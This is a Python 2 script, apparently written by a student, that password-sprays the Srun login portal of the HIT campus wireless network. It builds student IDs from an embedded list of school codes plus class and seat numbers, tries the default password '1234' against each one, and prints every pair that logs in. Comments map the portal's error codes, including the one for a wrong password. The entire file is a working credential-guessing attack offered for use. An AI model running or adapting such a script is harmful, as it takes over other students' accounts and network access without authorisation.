# -*- coding:utf-8 -*-

#           DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
#                     Version 2, December 2004

#               Copyright (C) 2015 winlandiano

#  Everyone is permitted to copy and distribute verbatim or modified
#  copies of this license document, and changing it is allowed as long
#  as the name is changed.

#             DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
#    TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION

#  0. You just DO WHAT THE FUCK YOU WANT TO.


# 运行环境Python 2.7.6
# FUCK HIT-WLAN!
# 估计HIT和REFER等192.168.108.13需要进行调整
# 注意：茶水不好喝

import urllib, urllib2, cookielib

school_list = []

def post3(usrname, pwd):
    cj = cookielib.CookieJar()
    url_login = 'http://192.168.108.13/cgi-bin/srun_portal'
    body = {
        'action': 'login',
        'username': usrname,
        'password': pwd,
        'ac_id': '1',
        'type': '1',
        'wbaredirect': 'http://8.8.8.8/',
        'mac': '',
        'user_ip': '',
        'vrf_id': '0'
    }
    # action=login&username=myusername&password=mypassword&ac_id=1&type=1&wbaredirect=http://8.8.8.8/&mac=&user_ip=&vrf_id=0
    my_headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36',
        'Refer': 'http://192.168.108.13/srun_portal.html?url=http://8.8.8.8/&ac_id=1',
        "Origin": 'http://192.168.108.13',
        'Host': "192.168.108.13",
        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Cookie': 'srun_login=' + usrname + '%7C' + pwd + '%7C%7C%7C%7C1',
        'Connection': 'keep-alive'
    }

    # action=login&username=myusername&password=mypassword&ac_id=1&type=1&wbaredirect=http://8.8.8.8/&mac=&user_ip=&vrf_id=0
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    urllib2.install_opener(opener)
    req = urllib2.Request(url_login, data=urllib.urlencode(body), headers=my_headers, )
    u = urllib2.urlopen(req)
    response = u.read().decode('utf-8').encode('gbk')
    if 'login_ok' == response:
        print usrname, pwd, response

        body = {
            'action': 'logout',
        }
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        urllib2.install_opener(opener)
        req = urllib2.Request(url_login, data=urllib.urlencode(body), headers=my_headers, )
        u = urllib2.urlopen(req)
        response = u.read().decode('utf-8').encode('gbk')
        print 'success then logout with response', response


def regex_school():
    s = '<option value="001-预科">001-预科</option><option value="010-测控技术与仪器类">010-测控技术与仪器类</option><option value="011-测控技术与仪器">011-测控技术与仪器</option><option value="012-光电信息工程">012-光电信息工程</option><option value="013-光电信息科学与工程(光电仪器方向)">013-光电信息科学与工程(光电仪器方向)</option><option value="020-能源动力类">020-能源动力类</option><option value="021-热能与动力工程">021-热能与动力工程</option><option value="022-飞行器动力工程">022-飞行器动力工程</option><option value="023-核反应堆工程">023-核反应堆工程</option><option value="024-能源与动力工程">024-能源与动力工程</option><option value="025-核工程与核技术">025-核工程与核技术</option><option value="030-计算机科学与技术类">030-计算机科学与技术类</option><option value="031-计算机科学与技术">031-计算机科学与技术</option><option value="032-信息安全">032-信息安全</option><option value="033-生物信息技术">033-生物信息技术</option><option value="034-生物信息学">034-生物信息学</option><option value="040-自动化类">040-自动化类</option><option value="041-自动化">041-自动化</option><option value="042-探测制导与控制技术">042-探测制导与控制技术</option><option value="050-通信工程类">050-通信工程类</option><option value="051-通信工程">051-通信工程</option><option value="052-电子信息工程">052-电子信息工程</option><option value="053-信息对抗技术">053-信息对抗技术</option><option value="054-遥感科学与技术">054-遥感科学与技术</option><option value="055-电磁场与无线技术">055-电磁场与无线技术</option><option value="059-通信工程(微波技术)">059-通信工程(微波技术)</option><option value="05A-电子信息工程类">05A-电子信息工程类</option><option value="05X-通信工程">05X-通信工程</option><option value="05Y-电子信息工程">05Y-电子信息工程</option><option value="061-电气工程及其自动化">061-电气工程及其自动化</option><option value="062-建筑电气与智能化">062-建筑电气与智能化</option><option value="070-化学类">070-化学类</option><option value="073-材料化学">073-材料化学</option><option value="074-应用化学">074-应用化学</option><option value="075-核化工与核燃料工程">075-核化工与核燃料工程</option><option value="080-机械设计制造及其自动化类">080-机械设计制造及其自动化类</option><option value="081-机械设计制造及其自动化">081-机械设计制造及其自动化</option><option value="082-工业设计">082-工业设计</option><option value="083-飞行器制造工程">083-飞行器制造工程</option><option value="084-工业工程">084-工业工程</option><option value="085-机械电子工程">085-机械电子工程</option><option value="091-材料成型及控制工程">091-材料成型及控制工程</option><option value="100-管理科学与工程类">100-管理科学与工程类</option><option value="101-信息管理与信息系统">101-信息管理与信息系统</option><option value="102-电子商务">102-电子商务</option><option value="10A-信息管理与信息系统">10A-信息管理与信息系统</option><option value="110-物理学类">110-物理学类</option><option value="111-应用物理学">111-应用物理学</option><option value="112-光信息科学与技术">112-光信息科学与技术</option><option value="113-核物理">113-核物理</option><option value="8-光电信息科学与工程">8-光电信息科学与工程</option><option value="120-数学类">120-数学类</option><option value="121-数学与应用数学">121-数学与应用数学</option><option value="122-信息与计算科学">122-信息与计算科学</option><option value="123-统计学">123-统计学</option><option value="131-工程管理">131-工程管理</option><option value="13A-工程管理">13A-工程管理</option><option value="13Z-工程管理">13Z-工程管理</option><option value="141-高分子材料与工程">141-高分子材料与工程</option><option value="142-化学工程与工艺">142-化学工程与工艺</option><option value="143-能源化学工程">143-能源化学工程</option><option value="144-高分子材料与工程（英）">144-高分子材料与工程（英）</option><option value="145-化学工程与工艺(英）">145-化学工程与工艺(英）</option><option value="151-英语">151-英语</option><option value="152-俄语">152-俄语</option><option value="153-日语">153-日语</option><option value="157-英语">157-英语</option><option value="158-俄语">158-俄语</option><option value="159-俄语_国际经济与贸易">159-俄语_国际经济与贸易</option><option value="161-社会学">161-社会学</option><option value="163-汉语言文学">163-汉语言文学</option><option value="168-社会学_英语">168-社会学_英语</option><option value="169-社会学体育特长班">169-社会学体育特长班</option><option value="180-飞行器设计与工程类">180-飞行器设计与工程类</option><option value="181-工程力学">181-工程力学</option><option value="182-飞行器设计与工程">182-飞行器设计与工程</option><option value="183-飞行器环境与生命保障工程">183-飞行器环境与生命保障工程</option><option value="184-复合材料与工程">184-复合材料与工程</option><option value="185-空间科学与技术">185-空间科学与技术</option><option value="190-材料科学与工程">190-材料科学与工程</option><option value="19A-材料科学与工程类">19A-材料科学与工程类</option><option value="200-工商管理类">200-工商管理类</option><option value="201-工商管理">201-工商管理</option><option value="202-市场营销">202-市场营销</option><option value="203-会计学">203-会计学</option><option value="204-财务管理">204-财务管理</option><option value="205-工商管理（英）">205-工商管理（英）</option><option value="20A-工商管理">20A-工商管理</option><option value="20B-市场营销">20B-市场营销</option><option value="20C-会计学">20C-会计学</option><option value="20D-财务管理">20D-财务管理</option><option value="20E-旅游管理">20E-旅游管理</option><option value="210-电子科学与技术类">210-电子科学与技术类</option><option value="211-电子科学与技术">211-电子科学与技术</option><option value="212-电子信息科学与技术">212-电子信息科学与技术</option><option value="213-光电信息科学与工程(光学工程方向)">213-光电信息科学与工程(光学工程方向)</option><option value="21X-光信息科学与技术">21X-光信息科学与技术</option><option value="220-经济学类">220-经济学类</option><option value="221-金融学">221-金融学</option><option value="222-国际经济与贸易">222-国际经济与贸易</option><option value="22A-金融学">22A-金融学</option><option value="22B-国际经济与贸易">22B-国际经济与贸易</option><option value="231-国际经济与贸易">231-国际经济与贸易</option><option value="232-经济学">232-经济学</option><option value="238-国际经济与贸易（太平洋项目）">238-国际经济与贸易（太平洋项目）</option><option value="239-国际经济与贸易体育特长班">239-国际经济与贸易体育特长班</option><option value="242-法学">242-法学</option><option value="250-给水排水工程">250-给水排水工程</option><option value="251-给排水科学与工程">251-给排水科学与工程</option><option value="261-建筑环境与设备工程">261-建筑环境与设备工程</option><option value="262-建筑环境与能源应用工程">262-建筑环境与能源应用工程</option><option value="270-环境工程类">270-环境工程类</option><option value="271-环境工程">271-环境工程</option><option value="272-环境科学">272-环境科学</option><option value="280-生物科学类">280-生物科学类</option><option value="280-生物科学类">280-生物科学类</option><option value="281-生物技术">281-生物技术</option><option value="282-生物工程">282-生物工程</option><option value="28A-生物技术">28A-生物技术</option><option value="28B-生物工程">28B-生物工程</option><option value="290-焊接技术与工程类">290-焊接技术与工程类</option><option value="291-焊接技术与工程">291-焊接技术与工程</option><option value="292-电子封装技术">292-电子封装技术</option><option value="300-数字媒体技术类">300-数字媒体技术类</option><option value="301-广播电视编导">301-广播电视编导</option><option value="302-广告学">302-广告学</option><option value="303-数字媒体技术">303-数字媒体技术</option><option value="304-广播电视编导">304-广播电视编导</option><option value="30X-广播电视编导（数字媒体艺术）">30X-广播电视编导（数字媒体艺术）</option><option value="30Y-广告学">30Y-广告学</option><option value="320-交通运输类">320-交通运输类</option><option value="321-道路桥梁与渡河工程">321-道路桥梁与渡河工程</option><option value="322-交通工程">322-交通工程</option><option value="323-交通运输">323-交通运输</option><option value="324-交通信息与控制工程">324-交通信息与控制工程</option><option value="325-交通设备与控制工程">325-交通设备与控制工程</option><option value="330-土木工程类">330-土木工程类</option><option value="331-土木工程">331-土木工程</option><option value="332-理论与应用力学">332-理论与应用力学</option><option value="333-土木工程（英）">333-土木工程（英）</option><option value="334-城市地下空间工程">334-城市地下空间工程</option><option value="339-土木工程_理论与应用力学">339-土木工程_理论与应用力学</option><option value="340-城市规划类">340-城市规划类</option><option value="341-建筑学">341-建筑学</option><option value="342-城市规划">342-城市规划</option><option value="343-艺术设计">343-艺术设计</option><option value="344-景观学">344-景观学</option><option value="345-城乡规划">345-城乡规划</option><option value="346-环境设计">346-环境设计</option><option value="347-风景园林">347-风景园林</option><option value="34A-艺术设计">34A-艺术设计</option><option value="351-材料物理">351-材料物理</option><option value="360-英才学院">360-英才学院</option><option value="361-实验学院">361-实验学院</option><option value="371-软件工程">371-软件工程</option><option value="372-软件工程(联合培养班)">372-软件工程(联合培养班)</option><option value="373-物联网工程">373-物联网工程</option><option value="379-软件工程">379-软件工程</option><option value="381-临床医学">381-临床医学</option><option value="382-基础医学">382-基础医学</option><option value="391-中医班">391-中医班</option><option value="400-英才班">400-英才班</option><option value="411-食品科学与工程">411-食品科学与工程</option><option value="421-电气工程及其自动化（中外合作）">421-电气工程及其自动化（中外合作）</option><option value="441-光电子材料与器件">441-光电子材料与器件</option><option value="442-光电信息科学与工程(系统方向)">442-光电信息科学与工程(系统方向)</option><option value="450-化学类">450-化学类</option><option value="451-材料化学">451-材料化学</option><option value="452-应用化学">452-应用化学</option><option value="461-林大班">461-林大班</option><option value="501-车辆工程">501-车辆工程</option>'
    import re
    l = re.findall(r'(?<=value=\").*?(?=-)', s)
    print '所有学院', l
    return l


def main():
    global school_list
    school_list = regex_school()
    # 学号组成为1YYSSSCCNN

    print '查找中。。。'
    for i in range(13, 14):
        for school in school_list:
            for clas in range(1, 7):
                for person in range(1, 40):
                    if person < 10:
                        p = '0'+str(person)
                    else:
                        p = str(person)
                    post3('1'+str(i)+str(school)+'0'+str(clas)+p, '1234')

    print "查找完毕，享受去吧~~"


if __name__ == '__main__':
    main()
    # 返回类型有
    # E2531: User not found.
    # E2901: (Third party -1)Cannot connect to the third_auth server.
    # E2620: You are already online.
    # E2901: (Third party 30002)sam_err:30002   PS:这个是密码错误
    # login_ok


